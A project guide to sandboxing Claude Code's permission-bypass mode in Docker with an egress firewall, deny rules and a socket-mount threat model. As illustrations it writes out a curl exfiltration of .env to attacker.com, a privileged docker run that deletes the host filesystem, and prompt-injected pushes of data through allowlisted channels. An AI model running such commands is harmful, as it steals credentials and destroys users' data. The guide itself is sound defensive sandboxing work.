# Running Claude Code with `--dangerously-skip-permissions` Safely

`--dangerously-skip-permissions` (also called bypass mode / YOLO mode) makes Claude Code skip every permission prompt. On your host that's a footgun: a prompt-injection in some scraped doc, or just a misread spec, can lead to deleting files outside the project, exfiltrating credentials, or running arbitrary commands. The accepted mitigation is to run Claude Code inside a Docker container with **filesystem isolation + egress firewall**, so the blast radius is contained even when the agent has unfettered tool access.

This project ships two ways to do that, plus a documented safety model.

## What the container protects you from (and what it doesn't)

**Protects:**
- Host filesystem damage outside the mounted `/workspace`. Claude cannot `rm` your home directory, edit your `~/.bashrc`, or read `~/Documents/passwords.txt` — those paths don't exist in the container.
- Outbound network calls to unallowlisted domains. `init-firewall.sh` drops all egress except a curated allowlist (Anthropic API, package registries, GitHub, project docs, the eight scrape-target vendors). A compromised Claude can't `curl http://attacker.com/exfil?data=$(cat .env)` because the connection won't complete.
- Persistent damage. The container is ephemeral (`--rm`); rebuild and you have a clean environment in seconds.

**Does NOT protect:**
- **The project itself.** `/workspace` is mounted read-write. Claude can `rm -rf /workspace/*`. Mitigations: the `settings.json` deny list still applies (more on this below), git commits at every task boundary (per the spec's working rules), and pushing to a remote regularly.
- **Exfiltration via allowlisted channels.** A prompt-injected Claude can `git push` to a public GitHub repo or fetch a malicious URL on `huggingface.co`. The firewall narrows but doesn't eliminate the exfiltration surface. Anthropic's own docs flag this contradiction ([issue #19978](https://github.com/anthropics/claude-code/issues/19978)).
- **Your Claude credentials.** The container persists `~/.claude` in a Docker volume. A malicious project mounted into the container could read it. Only run this with **trusted repositories**.
- **macOS host secrets.** Don't bind-mount `~/.ssh`, `~/.aws`, `~/.gnupg`, or any host credential dirs. The default mounts in this project are project-folder + Docker socket + Claude config volume only.

## Defense in depth: container × `settings.json` deny rules

Critically, **`deny` rules in `.claude/settings.json` still apply in bypass mode**. From the Claude Code permission docs:

> Check deny rules (from disallowed_tools and settings.json). If a deny rule matches, the tool is blocked, *even in bypassPermissions mode*.

So the deny list configured for this project (catastrophic deletion patterns, `git push --force`, `docker compose down -v`, `.env` reads, production deploy commands, sudo) **still works** when you run `claude --dangerously-skip-permissions`. The container handles host isolation; the deny list handles in-container footguns. They stack.

## Path A: VS Code DevContainer (recommended for interactive sessions)

Prerequisites:
- VS Code (or Cursor) with the Dev Containers extension
- Docker Desktop running

```bash
git clone <your-fork-of-this-spec>
cd llm-pricing-spec
code .
# Command Palette → "Dev Containers: Reopen in Container"
```

VS Code builds the image from `.devcontainer/Dockerfile`, applies `runArgs` (NET_ADMIN, NET_RAW), mounts the project at `/workspace`, runs `init-firewall.sh`, and drops you in a terminal inside the container.

```bash
# Inside the container:
claude
# First time only: authenticate with Anthropic
# (your auth persists in the llm-pricing-claude-config volume)

claude --dangerously-skip-permissions
# Start working through the spec
> Read CLAUDE.md, then spec/INDEX.md, then BOOTSTRAP.md, then start M00.
```

You'll see the bypass warning banner once and accept it. From then on, no prompts. Claude can `rm` files, run pytest, `docker compose up` (via the mounted Docker socket — see below), commit and push, install packages — all without interruption.

## Path B: Docker Compose standalone (no VS Code needed)

If you don't use VS Code, the same container is available via `compose.claude.yml`:

```bash
cd llm-pricing-spec

# Build the image (first time only)
docker compose -f compose.claude.yml build claude

# Start a session (drops you into a zsh shell inside the container)
docker compose -f compose.claude.yml run --rm claude

# Inside the container:
claude --dangerously-skip-permissions
```

After M00 has executed and created the project's `docker-compose.yml` for postgres/redis, you can run everything together:

```bash
docker compose -f docker-compose.yml -f compose.claude.yml up -d db redis
docker compose -f docker-compose.yml -f compose.claude.yml run --rm claude
```

The `external: true` network in `compose.claude.yml` joins the claude container to the same Docker network as postgres/redis so it can resolve them by hostname. Adjust the `name:` line to match your actual project network (typically `<projectdir>_default`).

## Path C: One-off `docker run` (zero-config, for headless tasks)

For a script-driven invocation with no compose / devcontainer overhead:

```bash
docker run --rm -it \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  -v "$PWD":/workspace \
  -v llm-pricing-claude-config:/home/node/.claude \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -w /workspace \
  llm-pricing-claude:latest \
  bash -c "sudo /usr/local/bin/init-firewall.sh && claude --dangerously-skip-permissions"
```

Useful for CI-driven runs, e.g. "run the M07 verification block and report".

## Why the Docker socket is mounted (and the tradeoff)

The container needs to start postgres/redis containers managed by host Docker so the project's tests can talk to them. Two options:

1. **Mount host Docker socket** (`/var/run/docker.sock`). The container's `docker compose up` talks to the host daemon and sibling containers come up on the host. **This is what we do.**
2. **Docker-in-Docker** (run a Docker daemon inside the claude container). Heavier; needs `--privileged`; not actually more isolated since the parent daemon can still see everything.

Option 1's caveat: **mounting the Docker socket effectively grants root on the host**. A compromised Claude could `docker run --privileged -v /:/host alpine sh -c 'rm -rf /host/'`. The firewall + deny rules + your trusted-repo discipline are what stop this. If your threat model can't accept this, run postgres/redis on the host directly and don't mount the socket — Claude won't be able to manage services but can still drive Django/pytest/migrations.

To remove the socket mount, delete the line from `.devcontainer/devcontainer.json` `mounts:` and `compose.claude.yml` `volumes:`.

## Firewall behavior

`init-firewall.sh` runs once on container create (`postCreateCommand`) and again on every start (`postStartCommand`). It:

1. Flushes all iptables rules and the `allowed-domains` ipset.
2. Sets default policy DROP for INPUT, FORWARD, OUTPUT.
3. Re-allows loopback, established connections, DNS, and Docker bridge subnets (so the claude container can talk to sibling postgres/redis).
4. Resolves ~50 allowlisted domains via DNS, adds resolved IPs to the `allowed-domains` ipset, allows TCP 443 and 80 to those IPs.
5. Verifies `api.anthropic.com` is reachable and `1.1.1.1` is not. Exits with an error if either check fails.

If you need to add a domain (e.g. another scrape vendor in Phase 2), edit `ALLOWED_DOMAINS` in `init-firewall.sh` and rebuild the container. The list is project-tuned; refer back to PRD §9 to see why each scrape-target domain is there.

**Caveat with CDN-backed domains:** ipset stores resolved IPs at firewall-init time. If GitHub (or any CDN-backed service) rotates IPs mid-session, you'll see connection failures. `postStartCommand` re-runs the script on every container start, which catches most rotation. If you see mid-session failures, just exit and re-enter the container.

## Verifying the sandbox

Once inside the container, these should all succeed:

```bash
# Claude API reachable
curl -sS -o /dev/null -w "%{http_code}\n" https://api.anthropic.com/

# Project docs reachable
curl -sS -o /dev/null -w "%{http_code}\n" https://docs.djangoproject.com/

# RunPod GraphQL reachable (M04 scrape target)
curl -sS -o /dev/null -w "%{http_code}\n" https://api.runpod.io/graphql

# Postgres reachable (after M00 brings the service up)
pg_isready -h db -U postgres
```

And these should fail (egress firewall blocking):

```bash
# Random external IP
timeout 3 curl https://1.1.1.1/ ; echo "exit=$?"

# Non-allowlisted domain
timeout 3 curl https://pastebin.com/ ; echo "exit=$?"
```

If allowed-domain tests succeed and blocked-domain tests time out, the sandbox is working.

## When NOT to use this setup

- **Untrusted repos.** The container does not protect against a malicious repo exfiltrating ~/.claude credentials via allowlisted channels.
- **Production secrets in the project.** Even with the deny list, don't put real credentials in a directory you're handing to an unsupervised agent.
- **Multi-tenant machines.** The Docker socket mount means anyone with shell access on the claude container has root on the host.

For all of those, run Claude with the standard `acceptEdits` permission mode on the host and accept the prompts. The container pattern is for solo developers iterating on trusted greenfield projects (like this one).

## Summary

| Layer | What it blocks |
|---|---|
| `defaultMode: "acceptEdits"` in settings.json | Nothing — but cuts out 90% of prompt fatigue on safe file edits |
| `settings.json` `allow` list | Bash commands you trust auto-approve; rest prompts |
| `settings.json` `deny` list | **Always applies, even in bypass mode.** Catastrophic deletion, force pushes, `.env` reads, etc. |
| Docker container filesystem isolation | Host filesystem damage outside `/workspace` |
| Docker container egress firewall | Outbound network to unallowlisted domains |
| `git commit` at every task boundary | Recovery from intra-project mistakes |

With all five layers, `claude --dangerously-skip-permissions` on this project becomes "let the agent rip overnight, review the commits in the morning." Which is the whole point.
